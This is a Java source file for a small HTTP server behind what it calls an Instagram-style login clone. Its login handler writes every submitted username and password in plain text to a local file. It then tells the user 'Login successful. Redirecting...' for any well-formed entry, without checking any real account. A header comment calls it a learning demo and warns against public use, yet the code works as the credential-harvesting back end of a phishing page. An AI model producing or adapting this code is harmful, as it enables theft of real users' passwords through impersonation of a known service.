import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;

import java.io.*;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Map;
import java.util.HashMap;

/**
 * Minimal local dev server for the Instagram-style login clone.
 * No external libraries needed — just the JDK.
 *
 * Run:
 *   javac LoginServer.java
 *   java LoginServer
 * Then open http://localhost:8080
 *
 * NOTE: This is a learning/demo project. It is meant to run on your own
 * machine while you test your own form. It stores whatever is typed into
 * the form, in plain text, into login_attempts.txt purely so you can see
 * the button is wired up correctly. Don't deploy this publicly or point
 * real users at it — a real login system should never log raw passwords.
 */
public class LoginServer {

    private static final int DEFAULT_PORT = 8080;
    private static final String LOG_FILE = "login_attempts.txt";

    public static void main(String[] args) throws IOException {
        int port = Integer.parseInt(System.getenv().getOrDefault("PORT", String.valueOf(DEFAULT_PORT)));
        HttpServer server = HttpServer.create(new InetSocketAddress(port), 0);

        server.createContext("/login", new LoginHandler());
        server.createContext("/", new StaticFileHandler());

        server.setExecutor(null);
        server.start();

        System.out.println("Server running at http://0.0.0.0:" + port);
        System.out.println("Login attempts will be appended to " + LOG_FILE);
    }

    /** Serves index.html, style.css, script.js from the current folder. */
    static class StaticFileHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) throws IOException {
            String uri = exchange.getRequestURI().getPath();
            if (uri.equals("/")) uri = "/index.html";

            Path base = Path.of(".").toAbsolutePath().normalize();
            Path filePath = base.resolve(uri.substring(1)).normalize();
            if (!filePath.startsWith(base) || !Files.exists(filePath) || Files.isDirectory(filePath)) {
                String notFound = "404 Not Found";
                exchange.sendResponseHeaders(404, notFound.length());
                exchange.getResponseBody().write(notFound.getBytes(StandardCharsets.UTF_8));
                exchange.getResponseBody().close();
                return;
            }

            String contentType = guessContentType(filePath.toString());
            byte[] bytes = Files.readAllBytes(filePath);

            exchange.getResponseHeaders().add("Content-Type", contentType);
            exchange.sendResponseHeaders(200, bytes.length);
            try (OutputStream os = exchange.getResponseBody()) {
                os.write(bytes);
            }
        }

        private String guessContentType(String path) {
            if (path.endsWith(".html")) return "text/html; charset=utf-8";
            if (path.endsWith(".css")) return "text/css; charset=utf-8";
            if (path.endsWith(".js")) return "application/javascript; charset=utf-8";
            return "application/octet-stream";
        }
    }

    /** Handles POST /login — logs the attempt to a local text file and replies with JSON. */
    static class LoginHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) throws IOException {
            if (!"POST".equalsIgnoreCase(exchange.getRequestMethod())) {
                exchange.sendResponseHeaders(405, -1);
                return;
            }

            String body = new String(exchange.getRequestBody().readAllBytes(), StandardCharsets.UTF_8);
            Map<String, String> fields = parseJson(body);
            String username = fields.getOrDefault("username", "");
            String password = fields.getOrDefault("password", "");

            String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss"));
            String logLine = timestamp + " | username=" + username + " | password=" + password + System.lineSeparator();

            try (FileWriter fw = new FileWriter(LOG_FILE, true)) {
                fw.write(logLine);
            }

            System.out.println("[LOGIN ATTEMPT] " + timestamp + " -> username=" + username);

            boolean validLogin = isValidLogin(username, password);
            String responseJson;
            int statusCode;

            if (validLogin) {
                responseJson = "{\"status\":\"ok\",\"message\":\"Login successful. Redirecting...\"}";
                statusCode = 200;
            } else {
                responseJson = "{\"status\":\"error\",\"message\":\"Please enter a valid username and password.\"}";
                statusCode = 401;
            }

            byte[] respBytes = responseJson.getBytes(StandardCharsets.UTF_8);

            exchange.getResponseHeaders().add("Content-Type", "application/json");
            exchange.sendResponseHeaders(statusCode, respBytes.length);
            try (OutputStream os = exchange.getResponseBody()) {
                os.write(respBytes);
            }
        }

        private boolean isValidLogin(String username, String password) {
            String cleanUsername = username == null ? "" : username.trim();
            String cleanPassword = password == null ? "" : password.trim();

            if (cleanUsername.isEmpty() || cleanPassword.isEmpty()) {
                return false;
            }

            if (cleanUsername.length() < 3 || cleanUsername.length() > 50) {
                return false;
            }

            if (cleanPassword.length() < 6 || cleanPassword.length() > 128) {
                return false;
            }

            if (cleanPassword.contains(" ") || cleanUsername.contains(" ")) {
                return false;
            }

            if (!cleanUsername.matches("^[A-Za-z0-9._@-]+$")) {
                return false;
            }

            return true;
        }

        /** Tiny hand-rolled parser for the flat {"username":"...","password":"..."} body — no external JSON lib needed. */
        private Map<String, String> parseJson(String json) {
            Map<String, String> map = new HashMap<>();
            json = json.trim();
            if (json.startsWith("{")) json = json.substring(1);
            if (json.endsWith("}")) json = json.substring(0, json.length() - 1);

            for (String pair : json.split(",")) {
                String[] kv = pair.split(":", 2);
                if (kv.length == 2) {
                    String key = kv[0].trim().replaceAll("^\"|\"$", "");
                    String value = kv[1].trim().replaceAll("^\"|\"$", "");
                    map.put(key, value);
                }
            }
            return map;
        }
    }
}
